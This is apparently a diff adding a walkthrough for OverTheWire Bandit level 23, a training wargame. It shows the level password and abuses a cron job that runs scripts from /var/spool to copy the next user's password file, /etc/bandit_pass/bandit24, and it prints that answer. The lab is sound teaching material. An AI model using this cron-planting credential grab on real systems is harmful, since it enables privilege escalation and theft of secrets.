@@ -1,0 +1,73 @@
+1.  First loging in to the remote server via ssh
+
+        $ ssh bandit23@bandit.labs.overthewire.org -p 2220
+		  username: bandit23
+		  password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n 
+
+	
+2.	As the admin says -
+		 " program is running automatically at regular intervals from cron, the time-based job scheduler.
+		 Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+		 NOTE: This level requires you to create your own first shell-script. This is a very big step and
+		 you should be proud of yourself when you beat this level!
+
+		 NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a 
+		 copy around…
+		 "
+		 
+
+3.	First moving to /etc/cron.d directory
+		
+		$ cd /etc/cron.d/  
+
+		$ cat cronjob_bandit24
+		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+	Now, we need to look at the /usr/bin/cronjob_bandit24.sh script
+
+		
+		$ cat /usr/bin/cronjob_bandit24.sh
+		#!/bin/bash
+
+		myname=$(whoami)
+
+		cd /var/spool/$myname
+		echo "Executing and deleting all scripts in /var/spool/$myname:"
+		for i in * .*;
+		do
+		    if [ "$i" != "." -a "$i" != ".." ];
+			then
+				echo "Handling $i"
+				timeout -s 9 60 ./$i
+				rm -f ./$i
+			fi
+		done
+
+	So, this script is executing and then deleting all the scripts in /var/spool/$username.
+
+	So we make a script in /tmp directory which copies /etc/bandit_pass/bandit24 to a file in this 
+	directory.
+
+		$ mkdir /tmp/my
+		$ vim script
+		#!/bin/bash
+
+		cat /etc/bandit_pass/bandit24 > /tmp/my/pass24.txt
+
+		$ chmod 755 script
+		$ cp script /var/spool/bandit24
+
+	After a minute a get to see a "pass24.txt" in the folder /tmp/my
+
+		$ ls
+		1.sh  pass24.txt  script
+
+		$ cat pass24.txt
+		UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+~>	The above string is the password to next level-24
+
+								
